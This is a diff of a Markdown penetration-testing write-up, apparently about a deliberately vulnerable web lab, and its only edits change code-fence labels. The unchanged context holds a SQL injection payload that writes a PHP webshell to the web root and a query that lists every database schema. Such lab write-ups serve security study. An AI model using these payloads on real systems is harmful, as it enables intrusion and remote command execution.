@@ -44,7 +44,7 @@ After some trial and error, the tester confirmed that there were two columns fro
 
 With the columns in mind, the tester crafted the following payload to write a PHP webshell payload into the `/var/www/html/tmp/` directory.
 
-```{bash}
+```bash
 ' UNION SELECT null, "<?php system($_GET['cmd']);?>"INTO OUTFILE "/var/www/html/tmp/shell1.php" #
 ``` 
 
@@ -72,7 +72,7 @@ Next, the encoded URL was appended to `/tmp/shell1.php` with the `cmd` parameter
 
 If the current user does not have sufficient privilege to conduct the `INTO OUTFILE` SQL query,  there were other methods to retrieve sensitive data.
 With the below command, the tester queried all available databases.
-```{bash}
+```bash
 ' union SELECT null, schema_name FROM information_schema.schemata #
 ```
 ![](/assets/sql/dataBases.png)  
@@ -106,7 +106,7 @@ Finally, the tester utilzed hashcat to crack the password and identified the adm
 ### Security-Low-Level
 ![](/assets/upload/easy.png)  
 In the `Security-Low-Level module`, there are zero security measures in place to limit user input.
-```{bash}
+```bash
 <?php
 
 if( isset( $_REQUEST[ 'Submit' ] ) ) {
